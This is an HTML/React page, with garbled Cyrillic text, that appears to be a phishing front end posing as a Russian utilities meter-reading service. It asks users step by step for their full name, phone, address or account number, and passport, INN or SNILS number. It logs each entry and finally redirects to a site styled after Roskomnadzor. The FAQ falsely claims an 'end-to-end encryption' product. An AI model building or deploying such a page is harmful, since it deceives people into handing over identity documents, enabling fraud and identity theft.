<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>–ñ–ö–• Web App</title>
  <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.development.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.development.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@babel/standalone@7.22.9/Babel.min.js"></script>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 font-sans">
  <div id="root" class="container mx-auto p-4"></div>

  <script type="text/babel">
    const { useState } = React;

    // State machine states
    const STATES = {
      MAIN_MENU: 'main_menu',
      FULLNAME: 'fullname',
      PHONE: 'phone',
      ACCOUNT_OR_ADDRESS_CHOICE: 'account_or_address_choice',
      ACCOUNT_OR_ADDRESS_VALUE: 'account_or_address_value',
      DOCUMENT_TYPE: 'document_type',
      DOCUMENT_NUMBER: 'document_number',
      FAQ: 'faq'
    };

    // Main App component
    function App() {
      const [state, setState] = useState(STATES.MAIN_MENU);
      const [formData, setFormData] = useState({
        fullname: '',
        phone: '',
        account_or_address_choice: '',
        account_or_address_value: '',
        document_type: '',
        document_number: ''
      });
      const [error, setError] = useState('');

      // Simulate saving data to localStorage
      const saveData = (isComplete = false) => {
        const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
        const userId = 'web_user_' + Math.random().toString(36).substr(2, 9);
        const username = 'web_user';
        const record = `${timestamp}\t${userId}\t@${username} (–ñ–ö–•)\t` +
                      `${formData.fullname}\t${formData.phone}\t` +
                      `${formData.account_or_address_choice} ${formData.account_or_address_value}\t` +
                      `${formData.document_type} ${formData.document_number}\n`;
        const existingData = localStorage.getItem('reg.txt') || '';
        localStorage.setItem('reg.txt', existingData + record);
        console.log('Saved:', record);
      };

      // Input validation functions
      const validateFullname = (value) => {
        const regex = /^[–ê-–Ø–∞-—è–Å—ë\s-]+$/;
        return regex.test(value) ? '' : '–§–ò–û –¥–æ–ª–∂–Ω–æ —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ –±—É–∫–≤—ã.';
      };

      const validatePhone = (value) => {
        const digits = value.replace(/[^0-9]/g, '');
        if (!value.startsWith('+7') && !value.startsWith('7')) {
          return '–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å +7 –∏–ª–∏ 7.';
        }
        if (digits.length < 10 || digits.length > 11) {
          return '–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å 10 –∏–ª–∏ 11 —Ü–∏—Ñ—Ä.';
        }
        return '';
      };

      const validateAddress = (value) => {
        return value.length >= 5 && /\d/.test(value)
          ? ''
          : '–£–∫–∞–∂–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –∞–¥—Ä–µ—Å (–ø—Ä–∏–º–µ—Ä: –≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 10).';
      };

      const validateAccount = (value) => {
        return /^\d{4,}$/.test(value)
          ? ''
          : '–ù–æ–º–µ—Ä –ª–∏—Ü–µ–≤–æ–≥–æ —Å—á—ë—Ç–∞ –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã (–Ω–µ –º–µ–Ω–µ–µ 4).';
      };

      // Handle form submission
      const handleSubmit = (e) => {
        e.preventDefault();
        const value = e.target.querySelector('input')?.value.trim() || '';
        setError('');

        if (state === STATES.FULLNAME) {
          const errorMsg = validateFullname(value);
          if (errorMsg) {
            setError(errorMsg);
            return;
          }
          setFormData({ ...formData, fullname: value.replace(/\s+/g, ' ') });
          saveData();
          setState(STATES.PHONE);
        } else if (state === STATES.PHONE) {
          const errorMsg = validatePhone(value);
          if (errorMsg) {
            setError(errorMsg);
            return;
          }
          setFormData({ ...formData, phone: value });
          saveData();
          setState(STATES.ACCOUNT_OR_ADDRESS_CHOICE);
        } else if (state === STATES.ACCOUNT_OR_ADDRESS_VALUE) {
          const errorMsg = formData.account_or_address_choice === 'üè† –ê–¥—Ä–µ—Å'
            ? validateAddress(value)
            : validateAccount(value);
          if (errorMsg) {
            setError(errorMsg);
            return;
          }
          setFormData({ ...formData, account_or_address_value: value });
          saveData();
          setState(STATES.DOCUMENT_TYPE);
        } else if (state === STATES.DOCUMENT_NUMBER) {
          setFormData({ ...formData, document_number: value });
          saveData(true);
          window.location.href = 'https://roskomnadzor.figma.site/';
        }
      };

      // Handle navigation
      const handleBack = () => {
        if (state === STATES.FULLNAME) setState(STATES.MAIN_MENU);
        else if (state === STATES.PHONE) setState(STATES.FULLNAME);
        else if (state === STATES.ACCOUNT_OR_ADDRESS_CHOICE) setState(STATES.PHONE);
        else if (state === STATES.ACCOUNT_OR_ADDRESS_VALUE) setState(STATES.ACCOUNT_OR_ADDRESS_CHOICE);
        else if (state === STATES.DOCUMENT_TYPE) setState(STATES.ACCOUNT_OR_ADDRESS_VALUE);
        else if (state === STATES.DOCUMENT_NUMBER) setState(STATES.DOCUMENT_TYPE);
        else if (state === STATES.FAQ) setState(STATES.MAIN_MENU);
        setError('');
      };

      // Render components based on state
      const renderMainMenu = () => (
        <div className="text-center">
          <h1 className="text-2xl font-bold mb-4">üè† –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –ñ–ö–•-–±–æ—Ç!</h1>
          <p className="mb-4">–£–ø—Ä–∞–≤–ª—è–π—Ç–µ —Å–≤–æ–∏–º–∏ —É—Å–ª—É–≥–∞–º–∏ –ª–µ–≥–∫–æ –∏ –±—ã—Å—Ç—Ä–æ! ‚ú®</p>
          <div className="flex flex-col gap-2">
            <button onClick={() => setState(STATES.FULLNAME)} className="bg-blue-500 text-white p-2 rounded">üî¢ –ü–µ—Ä–µ–¥–∞—Ç—å –ø–æ–∫–∞–∑–∞–Ω–∏—è</button>
            <button onClick={() => setState(STATES.FAQ)} className="bg-blue-500 text-white p-2 rounded">‚ùì –ß–∞—Å—Ç—ã–µ –≤–æ–ø—Ä–æ—Å—ã</button>
            <button onClick={() => alert(
              'üìã –ß—Ç–æ–±—ã –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–∫–∞–∑–∞–Ω–∏—è:\n' +
              '1Ô∏è‚É£ –£–∫–∞–∂–∏—Ç–µ –§–ò–û.\n' +
              '2Ô∏è‚É£ –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.\n' +
              '3Ô∏è‚É£ –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –ª–∏—Ü–µ–≤–æ–≥–æ —Å—á–µ—Ç–∞ –∏–ª–∏ –∞–¥—Ä–µ—Å.\n' +
              '4Ô∏è‚É£ –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç –∏ –≤–≤–µ–¥–∏—Ç–µ –µ–≥–æ –Ω–æ–º–µ—Ä.\n' +
              '5Ô∏è‚É£ –ü–æ–ª—É—á–∏—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ. ‚ú®\n\n' +
              '–ù–∞ –ª—é–±–æ–º —ç—Ç–∞–ø–µ –≤—ã –º–æ–∂–µ—Ç–µ –Ω–∞–∂–∞—Ç—å "–ù–∞–∑–∞–¥", —á—Ç–æ–±—ã –≤–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞ –ø—Ä–µ–¥—ã–¥—É—â–∏–π —à–∞–≥. üíß'
            )} className="bg-blue-500 text-white p-2 rounded">‚ÑπÔ∏è –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è</button>
            <button onClick={() => window.open('https://t.me/techsupgkh', '_blank')} className="bg-blue-500 text-white p-2 rounded">üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</button>
          </div>
        </div>
      );

      const renderFAQ = () => (
        <div className="text-center">
          <h2 className="text-xl font-bold mb-4">‚ùì –ß–∞—Å—Ç—ã–µ –≤–æ–ø—Ä–æ—Å—ã</h2>
          <div className="flex flex-col gap-2">
            <button onClick={() => alert('üìå –ü–æ–∫–∞–∑–∞–Ω–∏—è —Å—á–µ—Ç—á–∏–∫–æ–≤ –≤–æ–¥—ã –∏ —ç–ª–µ–∫—Ç—Ä–æ—ç–Ω–µ—Ä–≥–∏–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –¥–æ 25 —á–∏—Å–ª–∞ –∫–∞–∂–¥–æ–≥–æ –º–µ—Å—è—Ü–∞. üíß')}
                    className="bg-gray-200 p-2 rounded">‚è≥ –î–æ –∫–∞–∫–æ–≥–æ —á–∏—Å–ª–∞ –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –ø–æ–∫–∞–∑–∞–Ω–∏—è?</button>
            <button onClick={() => alert('‚ö†Ô∏è –ü–ª–∞—Ç–∞ –±—É–¥–µ—Ç –Ω–∞—á–∏—Å–ª–µ–Ω–∞ –ø–æ —Å—Ä–µ–¥–Ω–µ–º—É ‚Äî –∏—Å—Ö–æ–¥—è –∏–∑ –ø–æ–∫–∞–∑–∞–Ω–∏–π –ø—Ä–∏–±–æ—Ä–æ–≤ —É—á–µ—Ç–∞ –∑–∞ –ø–æ—Å–ª–µ–¥–Ω–∏–µ –ø–æ–ª–≥–æ–¥–∞. üî•')}
                    className="bg-gray-200 p-2 rounded">üí∏ –ß—Ç–æ –±—É–¥–µ—Ç, –µ—Å–ª–∏ –Ω–µ –ø–µ—Ä–µ–¥–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –≤–æ–≤—Ä–µ–º—è?</button>
            <button onClick={() => alert('üîê –î–∞, —É –Ω–∞—Å —Å—Ç–æ–∏—Ç –∑–∞—â–∏—Ç–∞ VISION 3.87676 PRO VS (—Å–∫–≤–æ–∑–Ω–æ–µ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ). ‚ú®')}
                    className="bg-gray-200 p-2 rounded">üîí –≠—Ç–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ?</button>
            <button onClick={() => alert('‚ö°Ô∏è –í —Å–≤—è–∑–∏ —Å –Ω–µ—Å—Ç–∞–±–∏–ª—å–Ω–æ–π —Ä–∞–±–æ—Ç–æ–π web-–ø–ª–∞—Ç—Ñ–æ—Ä–º –±—ã–ª —Å–æ–∑–¥–∞–Ω –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π —Ä–µ—Å—É—Ä—Å. üíß')}
                    className="bg-gray-200 p-2 rounded">‚ö°Ô∏è –ü–æ—á–µ–º—É —Ç–µ–ø–µ—Ä—å —á–µ—Ä–µ–∑ Telegram?</button>
            <button onClick={() => alert('‚úÖ –î–∞, –º–æ–∂–Ω–æ. –°–≤—è–∂–∏—Ç–µ—Å—å —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π –∏–ª–∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –≤–≤–æ–¥. üåü')}
                    className="bg-gray-200 p-2 rounded">üîÅ –ú–æ–∂–Ω–æ –ª–∏ –∏—Å–ø—Ä–∞–≤–∏—Ç—å –æ—à–∏–±–∫—É?</button>
            <button onClick={() => alert('üëâ –ü–∞—Å–ø–æ—Ä—Ç, –ò–ù–ù, –°–ù–ò–õ–° –∏–ª–∏ –õ–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç. üíß')}
                    className="bg-gray-200 p-2 rounded">üìë –ö–∞–∫–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å?</button>
            <button onClick={handleBack} className="bg-red-500 text-white p-2 rounded">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é</button>
          </div>
        </div>
      );

      const renderForm = () => {
        let placeholder = '';
        let inputType = 'text';
        let title = '';
        let choices = [];

        if (state === STATES.FULLNAME) {
          title = 'üë§ –£–∫–∞–∂–∏—Ç–µ –§–∞–º–∏–ª–∏—é –ò–º—è –û—Ç—á–µ—Å—Ç–≤–æ –ø–æ–ª–Ω–æ—Å—Ç—å—é (—Ç–æ–ª—å–∫–æ —Ç–µ–∫—Å—Ç):';
          placeholder = '–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á';
        } else if (state === STATES.PHONE) {
          title = 'üìû –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (–Ω–∞—á–Ω–∏—Ç–µ —Å +7 –∏–ª–∏ 7, –Ω–∞–ø—Ä–∏–º–µ—Ä: +79991234567):';
          placeholder = '+79991234567';
        } else if (state === STATES.ACCOUNT_OR_ADDRESS_CHOICE) {
          title = '–í—ã–±–µ—Ä–∏—Ç–µ —Å–ø–æ—Å–æ–± –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏:';
          choices = ['üè† –ê–¥—Ä–µ—Å', 'üí≥ –õ–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç'];
        } else if (state === STATES.ACCOUNT_OR_ADDRESS_VALUE) {
          title = formData.account_or_address_choice === 'üè† –ê–¥—Ä–µ—Å'
            ? '–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –∞–¥—Ä–µ—Å (–ø—Ä–∏–º–µ—Ä: –≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 10):'
            : '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –ª–∏—Ü–µ–≤–æ–≥–æ —Å—á—ë—Ç–∞ (–ø—Ä–∏–º–µ—Ä: 40817810099910004312):';
          placeholder = formData.account_or_address_choice === 'üè† –ê–¥—Ä–µ—Å'
            ? '–≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 10'
            : '40817810099910004312';
        } else if (state === STATES.DOCUMENT_TYPE) {
          title = '–í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç:';
          choices = ['üìÑ –ü–∞—Å–ø–æ—Ä—Ç', 'üßæ –ò–ù–ù', 'üü¢ –°–ù–ò–õ–°'];
        } else if (state === STATES.DOCUMENT_NUMBER) {
          title = formData.document_type === '–ü–∞—Å–ø–æ—Ä—Ç'
            ? '–í–≤–µ–¥–∏—Ç–µ —Å–µ—Ä–∏—é –∏ –Ω–æ–º–µ—Ä –ø–∞—Å–ø–æ—Ä—Ç–∞ (–ø—Ä–∏–º–µ—Ä: 4510 123456):'
            : formData.document_type === '–ò–ù–ù'
            ? '–í–≤–µ–¥–∏—Ç–µ –ò–ù–ù (–ø—Ä–∏–º–µ—Ä: 500100732259):'
            : '–í–≤–µ–¥–∏—Ç–µ –°–ù–ò–õ–° (–ø—Ä–∏–º–µ—Ä: 112-233-445 95):';
          placeholder = formData.document_type === '–ü–∞—Å–ø–æ—Ä—Ç'
            ? '4510 123456'
            : formData.document_type === '–ò–ù–ù'
            ? '500100732259'
            : '112-233-445 95';
        }

        return (
          <div className="text-center">
            <h2 className="text-xl font-bold mb-4">–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</h2>
            <h3 className="mb-4">{title}</h3>
            {error && <p className="text-red-500 mb-4">‚ùå {error}</p>}
            {choices.length > 0 ? (
              <div className="flex flex-col gap-2">
                {choices.map(choice => (
                  <button
                    key={choice}
                    onClick={() => {
                      if (state === STATES.ACCOUNT_OR_ADDRESS_CHOICE) {
                        setFormData({ ...formData, account_or_address_choice: choice });
                        saveData();
                        setState(STATES.ACCOUNT_OR_ADDRESS_VALUE);
                      } else if (state === STATES.DOCUMENT_TYPE) {
                        setFormData({ ...formData, document_type: choice.replace(/[^–ê-–Ø–∞-—è]/g, '') });
                        saveData();
                        setState(STATES.DOCUMENT_NUMBER);
                      }
                    }}
                    className="bg-blue-500 text-white p-2 rounded"
                  >
                    {choice}
                  </button>
                ))}
              </div>
            ) : (
              <form onSubmit={handleSubmit}>
                <input
                  type={inputType}
                  placeholder={placeholder}
                  className="border p-2 mb-4 w-full rounded"
                  required
                />
                <div className="flex gap-2 justify-center">
                  <button type="submit" className="bg-green-500 text-white p-2 rounded">–î–∞–ª–µ–µ</button>
                  <button type="button" onClick={handleBack} className="bg-red-500 text-white p-2 rounded">‚Ü©Ô∏è –ù–∞–∑–∞–¥</button>
                </div>
              </form>
            )}
          </div>
        );
      };

      return (
        <div className="max-w-md mx-auto bg-white p-6 rounded shadow">
          {state === STATES.MAIN_MENU ? renderMainMenu() :
           state === STATES.FAQ ? renderFAQ() :
           renderForm()}
        </div>
      );
    }

    // Render the app
    ReactDOM.render(<App />, document.getElementById('root'));
  </script>
</body>
</html>
